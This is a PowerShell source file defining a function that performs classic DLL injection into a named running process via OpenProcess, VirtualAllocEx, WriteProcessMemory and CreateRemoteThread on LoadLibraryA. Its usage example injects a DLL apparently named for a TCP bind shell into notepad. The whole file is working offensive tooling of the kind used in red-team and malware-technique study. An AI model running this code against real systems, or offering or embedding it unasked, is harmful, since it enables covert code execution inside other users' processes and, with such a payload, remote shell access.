function Process-Injection-Method1 {

	<#
	.SYNOPSIS
	This function is the Addtype method of using the Windows API to inject a DLL into a running process.
	
	.DESCRIPTION

	.PARAMETER Command

	.EXAMPLE
	PS C:\> Process-Injection-Method1 -processname notepad -dll_path c:\shell_bind_tcp_10000_x64.dll
	
	.INPUTS
	System.String
	
	.OUTPUTS
	None

	.NOTES

	.LINK
	
	#>

    [CmdletBinding()]
    [OutputType([String])]
    param (
        [Parameter(Mandatory=$true,Position=0)]
        [string]$processname,
        [Parameter(Mandatory=$true,Position=1)]
        [string]$dll_path
	)
	Begin {
		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		public enum ProcessAccess
		{
			PROCESS_ALL_ACCESS = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE),
			PROCESS_CREATE_PROCESS = 0x0080,
			PROCESS_CREATE_THREAD = 0x0002,
			PROCESS_DUP_HANDLE = 0x0040,
			PROCESS_QUERY_INFORMATION = 0x0400,
			PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
			PROCESS_SET_INFORMATION = 0x0200,
			PROCESS_SET_QUOTA = 0x0100,
			PROCESS_SUSPEND_RESUME = 0x0800,
			PROCESS_TERMINATE = 0x0001,
			PROCESS_VM_OPERATION = 0x0008,
			PROCESS_VM_READ = 0x0010,
			PROCESS_VM_WRITE = 0x0020,
			SYNCHRONIZE = 0x00100000
		};
		
		public enum AllocationProtectEnum
		{
			PAGE_EXECUTE = 0x00000010,
			PAGE_EXECUTE_READ = 0x00000020,
			PAGE_EXECUTE_READWRITE = 0x00000040,
			PAGE_EXECUTE_WRITECOPY = 0x00000080,
			PAGE_NOACCESS = 0x00000001,
			PAGE_READONLY = 0x00000002,
			PAGE_READWRITE = 0x00000004,
			PAGE_WRITECOPY = 0x00000008,
			PAGE_GUARD = 0x00000100,
			PAGE_NOCACHE = 0x00000200,
			PAGE_WRITECOMBINE = 0x00000400
		}
	
		public enum StateEnum
		{
			MEM_COMMIT = 0x1000,
			MEM_FREE = 0x10000,
			MEM_RESERVE = 0x2000
		};
	
		public enum TypeEnum
		{
			MEM_IMAGE = 0x1000000,
			MEM_MAPPED = 0x40000,
			MEM_PRIVATE = 0x20000
		};
		public static class KernelProcs {
		
			[DllImport("kernel32.dll")]
			public static extern IntPtr OpenProcess
			(
				UInt32 processAccess,
				bool bInheritHandle,
				int processId
			);
		
			[DllImport("kernel32.dll")]
			public static extern IntPtr VirtualAllocEx
			(
				IntPtr hProcess,
				IntPtr lpAddress,
				uint dwSize,
				int flAllocationType,
				int flProtect
			);
		
			[DllImport("kernel32.dll")]
			public static extern bool WriteProcessMemory
			(
				IntPtr hProcess,
				IntPtr lpBaseAddress,
				byte[] lpBuffer,
				uint nSize,
				ref UInt32 lpNumberOfBytesWritten
			);
		
			[DllImport("kernel32.dll")]
			public static extern IntPtr GetModuleHandle
			(
				string lpModuleName
			);
			
			[DllImport("kernel32")]
			public static extern IntPtr GetProcAddress
			(
				IntPtr hModule,
				string procName
			);
		
			[DllImport("kernel32.dll")]
			public static extern IntPtr CreateRemoteThread
			(
				IntPtr hProcess,
				IntPtr lpThreadAttributes,
				UInt32 dwStackSize,
				IntPtr lpStartAddress,
				IntPtr lpParameter,
				UInt32 dwCreationFlags,
				IntPtr lpThreadId
			);

			[DllImport("kernel32.dll")]
			public static extern uint WaitForSingleObject
			(
				IntPtr hModule, 
				uint dwMilliseconds
			);
		}
"@
	}
	Process {
		Write-Host -ForegroundColor Black -BackgroundColor Yellow "[+] Process injection using Add-Type method:"

		# Retrieve the Process ID of $processname
		#
		$ProcessID = (Get-Process -Name ${processname} -ErrorAction SilentlyContinue).Id
		if(!$ProcessID)
		{
			Write-Host -Foregroundcolor Red "[!] Could not find ${processname} running..."
			Break
		} elseif ($ProcessID -is [array]) {
			$ProcessID = $ProcessID[0]
		}
		Write-Host -Foregroundcolor White -NoNewLine "[+] Process ID of ${processname}: "
		Write-Host -Foregroundcolor Green $ProcessID
		

		# Dll ASCII String bytes
		#
		$DLLPath = (New-Object System.Text.ASCIIEncoding).GetBytes($dll_path)
		Write-Host -Foregroundcolor White -NoNewLine "[+] DLL path/filename in bytes: "
		Write-Host -Foregroundcolor Green $dll_path/$DLLPath
		

		# Open the remote process
		# PROCESS_ALL_ACCESS = 0x1F0FFF
		# https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
		#
		[IntPtr]$handleProcess = 0
		$handleProcess = [KernelProcs]::OpenProcess([ProcessAccess]::PROCESS_ALL_ACCESS, $false, $ProcessID); $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to process ${processname}/$ProcessID is: "
        if($handleProcess -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
			$x = "{0:X}" -f $handleProcess.ToInt64()
		    Write-Host -Foregroundcolor Green "0x$x"
        }



		# Allocate memory for the DLL
		# Allocated space is min of 4KB, and follows 4KB boundaries
		# MEM_COMMIT|MEM_RESERVE = 0x3000 & PAGE_READWRITE = 0x4
		# https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex
		# Returns a pointer to the allocated memory
		#
		[IntPtr]$pointerToAllocMem = 0
		$pointerToAllocMem = [KernelProcs]::VirtualAllocEx($handleProcess, [IntPtr]::Zero, $DLLPath.Length, [StateEnum]::MEM_COMMIT, [AllocationProtectEnum]::PAGE_EXECUTE_READWRITE); $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
		Write-Host -Foregroundcolor White -NoNewLine "[+] Pointer to allocated memory: "
        if($pointerToAllocMem -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
        } else {
			$x = "{0:X}" -f $pointerToAllocMem.ToInt64()
		    Write-Host -Foregroundcolor Green "0x$x"
        }


		# Write DLL string to allocated memory
		#
		[UInt32]$ReturnedBytes = 0
		
		# https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory
		# Returns zero on fail, otherwise a nonzero value
		#
		$result = [KernelProcs]::WriteProcessMemory($handleProcess,$pointerToAllocMem,$DLLPath,$DLLPath.Length,[ref]$ReturnedBytes); $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
		Write-Host -Foregroundcolor White -NoNewLine "[+] Bytes written to the buffer: "
        if($result -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
        } else {
            Write-Host -Foregroundcolor Green $ReturnedBytes
        }


		# Lookup the address Kernel32::LoadLibraryA
		# https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulehandlea
		# Handle to the Module Kernel32.dll
		#
		$handleKernel32 = [KernelProcs]::GetModuleHandle("kernel32.dll"); $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
		Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to Kernel32.dll: "
		if($handleKernel32 -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
			$x = "{0:X}" -f $handleKernel32.ToInt64()
		    Write-Host -Foregroundcolor Green "0x$x"
        }

		# https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress
		# Pointer to exported function or variable
		#
		$pointerToLoadLibA = [KernelProcs]::GetProcAddress($handleKernel32,"LoadLibraryA"); $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
		Write-Host -Foregroundcolor White -NoNewLine "[+] Pointer to LoadLibraryA: "
		if($pointerToLoadLibA -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
			$x = "{0:X}" -f $pointerToLoadLibA.ToInt64()
		    Write-Host -Foregroundcolor Green "0x$x"
        }

		# Create remote thread
		# https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread
		# Returns the handle to a new thread, else fail NULL
		#
		$handleThread = [KernelProcs]::CreateRemoteThread($handleProcess,[IntPtr]::Zero,0,$pointerToLoadLibA,$pointerToAllocMem,0,[IntPtr]::Zero)
		Write-Host -Foregroundcolor White -NoNewLine "[+] Handle to new thread in ${processname}: "
		if($handleThread -eq 0)
		{
            Write-Host -Foregroundcolor White -NoNewline "[!] Failed with Error code: "
            Write-Host -Foregroundcolor Green "$LastError"
			Break
		} else {
			$x = "{0:X}" -f $handleThread.ToInt64()
		    Write-Host -Foregroundcolor Green "0x$x"
		}
		
		# $wait = [KernelProcs]::WaitForSingleObject($handleThread, 0x7fffffff)
	}
	End {
		Write-Host -Foregroundcolor White -NoNewline "[+] "
		Write-Host -Foregroundcolor Black -BackgroundColor Green "Completed."
	}
}